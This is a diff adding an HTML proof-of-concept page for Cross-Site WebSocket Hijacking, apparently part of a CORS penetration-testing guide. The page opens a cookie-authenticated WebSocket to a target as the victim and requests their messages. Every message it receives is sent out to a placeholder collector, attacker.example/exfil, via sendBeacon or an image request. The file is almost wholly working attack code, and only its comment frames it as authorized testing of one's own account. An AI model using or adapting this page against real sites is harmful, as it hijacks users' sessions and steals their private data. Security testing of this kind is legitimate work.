@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<!--
+  cswsh.html — Cross-Site WebSocket Hijacking PoC (CORS_TESTING_GUIDE.md §13.3).
+
+  WebSockets do NOT honor the Same-Origin Policy or CORS. If the target's wss:// endpoint authenticates by
+  COOKIE and the handshake does NOT validate the Origin header, this attacker page opens a fully-authenticated
+  cross-origin socket as the victim — reading their stream and sending messages as them.
+
+  AUTHORIZED testing, OWN account only. Edit TARGET_WS / COLLECT / the app's message protocol. Take down after.
+  First confirm by replaying the WS handshake with Origin: https://evil.com (Burp Repeater WS / wscat) — does the
+  authenticated upgrade still succeed (101 Switching Protocols)? If yes, this page demonstrates the impact.
+-->
+<html><head><meta charset="utf-8"><title>cswsh poc</title></head>
+<body>
+<h2>Cross-Site WebSocket Hijacking PoC</h2>
+<pre id="out">connecting…</pre>
+<script>
+  const TARGET_WS = "wss://target.com/chat";              // <-- the cookie-authed WS endpoint
+  const COLLECT   = "https://attacker.example/exfil";     // <-- YOUR collector
+  const out = document.getElementById("out");
+
+  // browser sends the victim's cookies on the handshake; NO CORS/SOP gate applies to WebSockets.
+  const ws = new WebSocket(TARGET_WS);
+
+  ws.onopen = () => {
+    out.textContent = "WS OPEN (authenticated as the victim). Sending a benign read request…";
+    // edit to the app's protocol — a benign "list/get" action proves authenticated access:
+    ws.send('{"action":"getMessages"}');
+  };
+  ws.onmessage = (e) => {
+    out.textContent = "Received " + (("" + e.data).length) + " bytes from the victim's socket; exfiltrated.";
+    try { navigator.sendBeacon(COLLECT, e.data); }
+    catch (x) { new Image().src = COLLECT + "?d=" + encodeURIComponent(e.data); }
+  };
+  ws.onerror = () => { out.textContent = "WS error — endpoint may validate Origin (not CSWSH) or require a token."; };
+  ws.onclose = (e) => { if (e.code === 1006) out.textContent += "  (closed 1006 — handshake likely rejected.)"; };
+</script>
+</body></html>
